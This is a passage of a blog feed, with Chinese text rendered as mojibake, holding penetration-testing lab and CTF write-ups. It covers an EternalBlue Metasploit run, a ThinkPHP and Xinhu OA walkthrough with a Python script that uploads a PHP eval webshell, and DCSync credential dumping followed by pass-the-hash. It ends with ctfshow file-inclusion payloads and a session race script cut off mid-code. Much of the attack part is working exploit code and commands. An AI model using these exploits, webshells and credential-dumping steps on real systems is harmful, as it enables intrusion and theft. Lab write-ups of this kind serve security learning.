<strong>æ–‡ä»¶ä¼ è¾“è¯·æ±‚ï¼ˆTrans2_SESSION_SETUPï¼‰</strong>ï¼Œè¯¥è¯·æ±‚åŒ…å«ç²¾å¿ƒæ„é€ çš„å¤§å°å­—æ®µ</p><blockquote><p>åˆ†é…ä¸€ä¸ªå°ç¼“å†²åŒºï¼ˆæ¯”å¦‚ 1024 å­—èŠ‚ï¼‰ ç„¶åè¯•å›¾å†™å…¥æ¯”å®ƒæ›´å¤§çš„æ•°æ®ï¼ˆæ¯”å¦‚ 4096 å­—èŠ‚ï¼‰</p></blockquote><p>æœ€ç»ˆå¯¼è‡´ <strong>å†…å­˜è¶Šç•Œå†™ï¼ˆHeap Overflowï¼‰</strong></p><p>ç”±äºæ˜¯ <strong>å†…æ ¸æ€é©±åŠ¨</strong>å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œæ”»å‡»è€…èƒ½åˆ©ç”¨æº¢å‡ºæ§åˆ¶æŸäº›ç»“æ„ï¼Œæœ€ç»ˆåŠ«æŒæ‰§è¡Œæµï¼ˆæ¯”å¦‚ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼‰ï¼Œè¾¾åˆ°ï¼š</p><ul><li>ææƒï¼ˆRing 3 â†’ Ring 0ï¼‰</li><li>æ‰§è¡Œæ¶æ„ shellcode</li><li>æ¤å…¥æœ¨é©¬ &#x2F; åé—¨</li></ul></blockquote><p>ä¸æ‡‚ä¹Ÿæ²¡å…³ç³»ï¼Œäº†è§£åˆ°å®ƒæ˜¯é€šè¿‡å†…å­˜æº¢å‡ºå¯¼è‡´çš„å°±è¡Œäº†ï¼Œå…³é”®æ˜¯ä¼šç”¨</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åœ¨kalié‡Œé¢å»ç”¨msf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole    //è®©å®ƒçš„ç½‘ç»œæµé‡é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘</span><br><span class="line">use exploit/windows/smb/ms17<span class="built_in">_</span>010<span class="built_in">_</span>eternalblue  //å¯åŠ¨åç›´æ¥é€‰æ‹©æ¼æ´åˆ©ç”¨æ¨¡å—</span><br><span class="line">set payload windows/x64/meterpreter/bind<span class="built_in">_</span>tcp<span class="built_in">_</span>uuid //æ”»å‡»æˆåŠŸåè¦è¿è¡Œçš„ payload</span><br><span class="line">set RHOSTS 172.22.1.21  //è®¾ç½®è¦æ”»å‡»çš„ç›®æ ‡æœºå™¨çš„ ip</span><br><span class="line">exploit   //æ”»å‡»</span><br></pre></td></tr></table></figure><p>ä»£ç†ä¿®æ”¹åœ¨&#x2F;etc&#x2F;proxychains.conf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5 ip port</span><br></pre></td></tr></table></figure><p>æ‰“è¿›å»ä¹‹åå°±æ˜¯systemæƒé™äº†</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œInitial</title>
      <link href="/2025/12/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"/>
      <url>/2025/12/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>è¿›æ¥å‘ç°æ˜¯<code>tp</code>çš„å›¾æ ‡ï¼Œé‚£å°±ç›´æ¥ç”¨å·¥å…·ä¸€æŠŠæ¢­</p><p><img src="/../images/achieve/2025/12/image-20251203104533421.png" alt="image-20251203104533421"></p><p>ç›´æ¥<code>getshell</code>ï¼Œç”¨èšå‰‘è¿æ¥ï¼ç”¨sudoææƒ</p><p><img src="/../images/achieve/2025/12/image-20251203105041702.png" alt="image-20251203105041702"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;<span class="keyword">\!</span> find / -name flag*&#x27;</span><br><span class="line">sudo mysql -e &#x27;<span class="keyword">\!</span> cat /root/flag/f*&#x27;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæ˜¯æ— å¯†ç çŸ¥é“å¯†ç ä¹Ÿå¯ä»¥ï¼š</span><br><span class="line">mysql -u root -proot -e &quot;<span class="keyword">\!</span> whoami&quot; </span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251203105517955.png" alt="image-20251203105517955"></p><p>æ‹¿åˆ°ç¬¬ä¸€æ®µflagå¼€å§‹æ‰“å†…ç½‘</p><h2 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p><code>/tmp</code>ç›®å½•ä¸‹ä¸Šä¼ ä¸€ä¸ª<code>fscan</code>æ–¹ä¾¿æˆ‘ä»¬æ¼æ´æ‰«æï¼Œå¾…ä¼šè¦æ­å»ºéš§é“æ–¹ä¾¿æˆ‘ä»¬æµè§ˆå™¨è®¿é—®å†…ç½‘ï¼Œæ‰€ä»¥ä¸€èµ·ä¸Šä¼ </p><p><img src="/../images/achieve/2025/12/image-20251203110823328.png" alt="image-20251203110823328"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¾æ¬¡æ‰§è¡Œ</span><br><span class="line">chmod +x fscan</span><br><span class="line">./fscan -h 172.22.1.0/24</span><br><span class="line">cat result.txt</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] OsInfo 172.22.1.2    (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2ï¼šDCåŸŸæ§</span><br><span class="line">172.22.1.21ï¼šWindowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´</span><br><span class="line">172.22.1.18ï¼šä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ</span><br></pre></td></tr></table></figure><h3 id="ä¿¡å‘¼ç³»ç»Ÿ"><a href="#ä¿¡å‘¼ç³»ç»Ÿ" class="headerlink" title="ä¿¡å‘¼ç³»ç»Ÿ"></a>ä¿¡å‘¼ç³»ç»Ÿ</h3><p>å…ˆæ‰“ä¿¡å‘¼çš„è¿™ä¸ªç³»ç»Ÿï¼Œå»ºç«‹éš§é“</p><p>æŠŠlinux_x64_agentä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ï¼Œç„¶åæ‰§è¡Œ<code>chmod +x ./linux_x64_agent</code></p><p>æŠŠlinux_x64_adminä¸Šä¼ åˆ°è‡ªå·±çš„vpsä¸Šï¼Œç»™æ‰§è¡Œæƒé™åæ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l port -s 654321</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨è¿™å°å·²ç»getshellçš„æœºå™¨ä¸Šè¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c ip:port -s 654321 --reconnect 8</span><br></pre></td></tr></table></figure><p>è¦ä»€ä¹ˆç«¯å£ï¼Œè®°å¾—å…ˆåœ¨vpsä¸Šé¢å¼€ä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251203113446801.png" alt="image-20251203113446801"></p><p>æ­å»ºæˆåŠŸï¼Œç„¶ååœ¨vpsä¸Šæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks portè¿™ä¸ªç«¯å£ä¹Ÿæ˜¯è‡ªå·±å®š</span><br></pre></td></tr></table></figure><p>ç„¶åé…ç½®ä¸€ä¸‹ä»£ç†æœåŠ¡å™¨</p><p><img src="/../images/achieve/2025/12/image-20251203114039724.png" alt="image-20251203114039724"></p><p>ç›¸å½“äºæˆ‘ä»¬ç°åœ¨å°±æ˜¯ä»¥ip:port2çš„èº«ä»½å»è®¿é—®å†…ç½‘</p><p><img src="/../images/achieve/2025/12/image-20251203114225521.png" alt="image-20251203114225521"></p><p>è¯´æ˜¯ä¸€ä¸ªndayï¼Œæ‹¿inferå“¥å“¥çš„è„šæœ¬æ¥æ‰“ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;socks5://ip:port&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">session.post(url1, data=data1, proxies=proxy)</span><br><span class="line">res = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;, proxies=proxy)</span><br><span class="line">os.remove(<span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(res.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = res.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">session.get(url3, proxies=proxy)</span><br><span class="line">res = session.post(url_pre + filepath,data=&#123;<span class="string">&quot;Infernity&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘è¿æ¥ä¸€ä¸‹ï¼Œèšå‰‘ä¹Ÿè¦é…ç½®å¥½ä»£ç†ï¼Œç„¶åå°±æ‹¿ä¸‹è¿™å°æœºå­äº†</p><p><code>dir flag* /s</code>ç”¨<code>/s</code>é€’å½’æœç´¢ä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251203115244968.png" alt="image-20251203115244968"></p><p>æ‹¿åˆ°ç¬¬äºŒæ®µflag</p><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>æ¥ç€å¼€å§‹æ‰“æ°¸æ’ä¹‹è“</p><p><img src="/../images/achieve/2025/12/478eae8c-4932-4a70-b63a-809c1e2b6e72.png" alt="478eae8c-4932-4a70-b63a-809c1e2b6e72"></p><h3 id="DCSycn"><a href="#DCSycn" class="headerlink" title="DCSycn"></a>DCSycn</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi<span class="built_in">_</span>cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><blockquote><p>load kiwiï¼škiwi æ˜¯ Meterpreter çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä¸“é—¨ç”¨äº Windows å‡­æ®æå–ï¼ˆå¦‚æ˜æ–‡å¯†ç ã€NTLM å“ˆå¸Œã€Kerberos ç¥¨æ®ç­‰ï¼‰ã€‚</p><p>è¯¥å‘½ä»¤æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨ï¼ˆDCï¼‰çš„åŒæ­¥è¡Œä¸ºï¼Œä» xiaorang.lab åŸŸä¸­æå–æ‰€æœ‰ç”¨æˆ·ã€è®¡ç®—æœºã€ç»„ç­‰å¯¹è±¡çš„ NTLM å“ˆå¸Œ å’Œ Kerberos å¯†é’¥ï¼Œå¹¶ä»¥ CSV æ ¼å¼è¾“å‡ºã€‚</p></blockquote><p><img src="/../images/achieve/2025/12/image-20251203191423464.png" alt="image-20251203191423464"></p><p>è¿™é‡Œæˆ‘ä»¬æŠ“åˆ°äº†Administratorçš„hashï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨crackmapexecæ‰“hashä¼ é€’äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251203191955235.png" alt="image-20251203191955235"></p><p>è‡³æ­¤æ‹¿åˆ°flag</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´è‡ªå·±è¿˜æ˜¯æœ‰äº›ä¸æ‡‚ï¼Œæœ‰å‡ ä¸ªåœ°æ–¹æ¯”å¦‚<code>DCSycn</code>æ”»å‡»é‚£éƒ¨åˆ†è‡ªå·±è¿˜ä¸æ˜¯ç‰¹åˆ«æ‡‚ï¼Œåé¢å»å­¦ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯ä½“éªŒäº†ä¸€ä¸‹å†…ç½‘æ¸—é€çš„æµç¨‹</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DCYscnæ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow36Dç»ƒæ‰‹èµ›</title>
      <link href="/2025/11/30/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B/"/>
      <url>/2025/11/30/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸çŸ¥æ‰€æª-jpg"><a href="#ä¸çŸ¥æ‰€æª-jpg" class="headerlink" title="ä¸çŸ¥æ‰€æª.jpg"></a>ä¸çŸ¥æ‰€æª.jpg</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="built_in">$</span>file must has test</span><br></pre></td></tr></table></figure><p>è¯•äº†ä¸€ä¸‹getä¼ å‚ï¼Œå¤§æ¦‚ç‡æ˜¯æ–‡ä»¶åŒ…å«äº†ï¼Œä¼ªåè®®ç›´æ¥æ‰“</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/test/resource=index.</span><br></pre></td></tr></table></figure><p>è¿™ç‚¹ä¹‹å‰lilctfé‡Œé¢ä¹Ÿç”¨åˆ°è¿‡ï¼Œtestä¸æ˜¯filterå¯é€‰çš„å‚æ•°ï¼Œæ‰€ä»¥æ˜¯ä¸å½±å“çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“flagçš„æ–‡ä»¶åï¼Œåªèƒ½è¯•è¯•dataäº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=eval(<span class="built_in">$</span><span class="built_in">_</span>GET[a]);?&gt;test<span class="built_in">&amp;</span>a=system(&#x27;tac /F*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5(<span class="built_in">$</span>secret.<span class="built_in">$</span>name)===<span class="built_in">$</span>pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ç»™nameå’Œpasså…ˆéšä¾¿ä¼ ç‚¹ï¼Œå‘ç°cookieé‡Œé¢æœ‰ä¸ªhashå€¼ï¼Œè¯´ä¸å®šå°±æ˜¯md5($secret.$name)ï¼Œç»™passä¼ å…¥è¯•ä¸€è¯•ï¼Œokï¼Œæ‹¿åˆ°flflflflag.phpï¼Œæµè§ˆå™¨è®¿é—®ä¼šè·³è½¬ï¼Œæˆ‘ä»¬ä¾æ—§æŠ“åŒ…ï¼Œç„¶ååé¢å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>filterä¼ªåè®®æŠŠflflflflag.phpçš„æºç æ‹¿åˆ°ï¼Œæˆ‘æ˜¯å…ˆå°è¯•äº†æ—¥å¿—åŒ…å«ä½†æ˜¯ä¸€ç›´æ²¡å›æ˜¾ï¼Œå¯èƒ½å°±æ˜¯æ–‡ä»¶ä½ç½®é”™äº†ï¼è¯•ä¸‹sessionåŒ…å«</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid=<span class="string">&quot;flag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://0e1f2cca-e2cb-408d-8f4f-6c42b1999025.challenge.ctf.show/flflflflag.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):                          <span class="comment">#æ‰“å…¥sessionæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line">        f=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        r=session.post(</span><br><span class="line">            url=url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;feii.txt&#x27;</span>,f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):                          <span class="comment">#è¯»å–sessionæ–‡ä»¶è¿›è¡Œæ¡ä»¶ç«äº‰</span></span><br><span class="line">    <span class="keyword">while</span> event.is_set():</span><br><span class="line"></span><br><span class="line">        r=session.get(url=url, params = &#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/sess_flag&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;feii.txt&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] æˆåŠŸå†™å…¥ï¼å“åº”ï¼š&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] ç»§ç»­å°è¯•...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> sess:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(sess,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            